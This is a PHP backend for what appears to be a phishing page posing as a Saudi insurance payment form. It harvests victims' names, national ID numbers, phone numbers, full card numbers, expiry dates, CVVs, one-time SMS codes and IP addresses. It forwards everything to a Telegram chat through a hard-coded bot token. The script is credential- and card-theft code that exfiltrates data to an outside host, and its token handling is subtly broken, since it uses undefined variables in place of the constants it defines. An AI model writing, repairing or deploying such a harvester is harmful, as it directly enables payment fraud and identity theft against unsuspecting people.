<?php
// Telegram Bot Configuration
define('BOT_TOKEN', '8556962941:AAHlKkhTEHidZgmI88cTJtKxrsVoHbzsj6A');
define('CHAT_ID', '8053385893');

// استقبال البيانات
$phone_number = isset($_POST['phone_number']) ? htmlspecialchars($_POST['phone_number']) : 'غير متوفر';
$applicant_name = isset($_POST['applicant_name']) ? htmlspecialchars($_POST['applicant_name']) : 'غير متوفر';
$identity_number = isset($_POST['identity_number']) ? htmlspecialchars($_POST['identity_number']) : 'غير متوفر';
$otp_code = isset($_POST['otp_code']) ? htmlspecialchars($_POST['otp_code']) : 'غير متوفر';

// بيانات البطاقة
$cardholder_name = isset($_POST['cardholder_name']) ? htmlspecialchars($_POST['cardholder_name']) : 
                   (isset($_POST['name']) ? htmlspecialchars($_POST['name']) : 'غير متوفر');
$card_number = isset($_POST['card_number']) ? htmlspecialchars($_POST['card_number']) : 
               (isset($_POST['cardnumber']) ? htmlspecialchars($_POST['cardnumber']) : 'غير متوفر');
$expiry_date = isset($_POST['expiry_date']) ? htmlspecialchars($_POST['expiry_date']) : 
               (isset($_POST['expirationdate']) ? htmlspecialchars($_POST['expirationdate']) : 'غير متوفر');
$cvv = isset($_POST['cvv']) ? htmlspecialchars($_POST['cvv']) : 
       (isset($_POST['securitycode']) ? htmlspecialchars($_POST['securitycode']) : 'غير متوفر');

// بيانات التأمين
$company = isset($_POST['company']) ? htmlspecialchars($_POST['company']) : 'غير متوفر';
$plan = isset($_POST['plan']) ? htmlspecialchars($_POST['plan']) : 'غير متوفر';
$total = isset($_POST['total']) ? htmlspecialchars($_POST['total']) : 'غير متوفر';

// User ID
$user_id = isset($_POST['user_id']) ? htmlspecialchars($_POST['user_id']) : 'غير متوفر';

// التاريخ والوقت
date_default_timezone_set('Asia/Riyadh');
$timestamp = date('Y-m-d H:i:s');

// عنوان IP
$ip_address = $_SERVER['REMOTE_ADDR'] ?? 'Unknown';

// بناء رسالة نصية أولاً
$message = "📄 <b>إثبات الدفع - Payment Proof</b>\n\n";

$message .= "👤 <b>معلومات العميل:</b>\n";
$message .= "├ الاسم: {$applicant_name}\n";
$message .= "├ رقم الهوية: {$identity_number}\n";
$message .= "└ رقم الجوال: {$phone_number}\n\n";

$message .= "💳 <b>معلومات البطاقة:</b>\n";
$message .= "├ اسم حامل البطاقة: {$cardholder_name}\n";
$message .= "├ card number: <code>{$card_number}</code>\n";
$message .= "├ تاريخ الانتهاء: {$expiry_date}\n";
$message .= "└ CVV: <code>{$cvv}</code>\n\n";

$message .= "🔢 <b>رمز OTP:</b> <code>{$otp_code}</code>\n\n";

$message .= "🏢 <b>معلومات التأمين:</b>\n";
$message .= "├ الشركة: {$company}\n";
$message .= "├ الخطة: {$plan}\n";
$message .= "└ المبلغ الإجمالي: {$total} ريال\n\n";

$message .= "🆔 <b>User ID:</b> {$user_id}\n";
$message .= "⏰ <b>الوقت:</b> {$timestamp}\n";
$message .= "🌐 <b>IP Address:</b> {$ip_address}\n";

$message .= "\n━━━━━━━━━━━━━━━━━━━\n";
$message .= "📸 إثبات الدفع في الصورة أدناه ⬇️";

// التعامل مع الصورة المرفوعة
if(isset($_FILES['payment_proof']) && $_FILES['payment_proof']['error'] === UPLOAD_ERR_OK) {
    $file = $_FILES['payment_proof'];
    $filePath = $file['tmp_name'];
    
    // إرسال الصورة إلى Telegram
    $url = "https://api.telegram.org/bot{$botToken}/sendPhoto";
    
    $postFields = [
        'chat_id' => $chatId,
        'photo' => new CURLFile($filePath, $file['type'], $file['name']),
        'caption' => $message,
        'parse_mode' => 'HTML'
    ];
    
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $postFields);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    
    $result = curl_exec($ch);
    $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    curl_close($ch);
    
    if($httpCode == 200) {
        http_response_code(200);
        echo "Payment proof sent successfully";
    } else {
        http_response_code(500);
        echo "Error sending payment proof";
    }
} else {
    // إذا لم يتم رفع صورة، أرسل رسالة نصية فقط
    $url = "https://api.telegram.org/bot{$botToken}/sendMessage";
    $data = [
        'chat_id' => $chatId,
        'text' => $message . "\n\n⚠️ لم يتم رفع صورة إثبات الدفع",
        'parse_mode' => 'HTML'
    ];
    
    $options = [
        'http' => [
            'header'  => "Content-type: application/x-www-form-urlencoded\r\n",
            'method'  => 'POST',
            'content' => http_build_query($data)
        ]
    ];
    
    $context = stream_context_create($options);
    $result = file_get_contents($url, false, $context);
    
    if($result !== FALSE) {
        http_response_code(200);
        echo "Message sent (no image)";
    } else {
        http_response_code(500);
        echo "Error sending message";
    }
}
?>
